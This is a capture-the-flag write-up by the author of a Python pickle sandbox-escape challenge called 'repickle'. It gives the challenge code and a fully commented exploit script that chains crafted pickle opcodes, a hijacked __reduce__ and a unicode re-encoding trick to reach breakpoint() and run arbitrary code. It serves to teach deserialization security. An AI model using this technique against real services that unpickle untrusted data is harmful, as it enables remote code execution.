# repickle

i was hoping that only a few teams would figure out how to solve it and only a few teams ended up solving it so that was good i guess

## challenge

```
import io
from pickle import *
from functools import partial
import sandbox


class RestrictedUnpickler(Unpickler):
    def find_class(self, mod: str, attr: str):
        if attr == "SandboxClass":
            return sandbox.SandboxClass
        if attr == "sandbox":
            return sandbox

        # true wizardry
        if attr == "partial":
            return partial
        if attr == "next":
            return next
        if attr == "iter":
            return iter


class LessRestrictedUnpickler(Unpickler):
    def find_class(self, mod: str, attr: str):
        assert mod == "sandbox"
        return Unpickler.find_class(self, mod, attr)


p = bytes.fromhex(input("> "))
assert len(p) < 318

LessRestrictedUnpickler(io.BytesIO(dumps(*RestrictedUnpickler(io.BytesIO(p)).load()))).load()
```

for full handout (required for solve), see [handout_repickle.zip](./handout_repickle.zip)

## solution

intended (by me)

```
from pickle import *

# ====== p2 is the arbitrary code execution on the less restricted pickler ======

p2 = b''

# the p2 payload has to be made so that when it is encoded with utf8 and then decoded with latin-1, it is functioning.
# we can use a trick similar to dicectf 2024 unipickle, but in reverse. we use the binget opcode here because it makes
# the payload short

p2 += UNICODE + b'sandbox\n'
p2 += GLOBAL + b'sandbox\nv\n'
p2 += PUT + b'194\n'
p2 += POP
p2 += BINGET
p2 += PROTO + b'\x04' + POP + BINGET + STACK_GLOBAL

# we cannot have '.' in this payload, so we have to use the sandbox.v to get strings with periods in them, and then use
# stack global to get breakpoint and then win.

p2 += MARK + UNICODE + b'breakpoint\n' + TUPLE + REDUCE + EMPTY_TUPLE + REDUCE

# the below is a quick hack that is necessary (for reasons)

p2 = b''.join((b'\\u00' + (hex(q).encode('latin-1')[2:].rjust(2, b'0'))) if not 127 >= q >= 32 else q.to_bytes(1, 'big') for q in p2)

# ====== p sets it up so p2 runs =================================================

p = b''

# memo[0] = SandboxClass()

p += GLOBAL + b'\nSandboxClass\n'
p += EMPTY_TUPLE
p += REDUCE
p += PUT + b'0\n'

# sandbox['\n'+p2] = memo[0]
# sandbox[''] = None
# sandbox['v'] = '__builtins__.__getitem__'

p += GLOBAL + b'\nsandbox\n'
p += NONE
p += MARK
p += UNICODE + b'\\u000a' + p2 + b'\n'
p += GET + b'0\n'
p += UNICODE + b'\n'
p += NONE
p += UNICODE + b'v\n'
p += UNICODE + b'__builtins__.__getitem__\n'
p += DICT
p += TUPLE2
p += BUILD
p += POP

# partial(next, iter(['\n'+p2])) is a function that returns '\n'+p2 when called
# memo[0].__reduce__ = partial(next, iter(['\n'+p2]))
# when the SandboxClass obj at memo[0] is reduced, it will return a '\n'+p2

p += EMPTY_TUPLE
p += MARK
p += UNICODE + b'__reduce__\n'
p += GLOBAL + b'\npartial\n'
p += GLOBAL + b'\nnext\n'
p += GLOBAL + b'\niter\n'
p += MARK
p += UNICODE + b'\\u000a' + p2 + b'\n'
p += LIST
p += TUPLE1
p += REDUCE
p += TUPLE2
p += REDUCE
p += DICT
p += TUPLE2
p += BUILD

# we return [memo[0], 3] so the proto of the pickler is 3 and the SandboxClass obj at memo[0] gets pickled

p += INT + b'3\n'
p += TUPLE2

# when the memo[0] gets pickled, the __reduce__ returns '\n'+p2. since sandbox module has an attribute '\n'+p2 that is
# equal to the memo[0], the "obj is not obj2" check on line 1075 of pickle.py will be false, so the prog will continue
# then, line 1102 of pickle.py runs, allowing us to escape and run arbitrary code on the less restricted unpickler

# see the beginning of the file for the payload for that

p += STOP

print(p.hex())
```

unintended (by lebr0nli)

[https://gist.github.com/lebr0nli/b82369b27b010731c6cd43f4fdb9f3d7](https://gist.github.com/lebr0nli/b82369b27b010731c6cd43f4fdb9f3d7)

interesting that `__qualname__` is used, forgot about that (no partial, next, or iter are required !!!! epic)
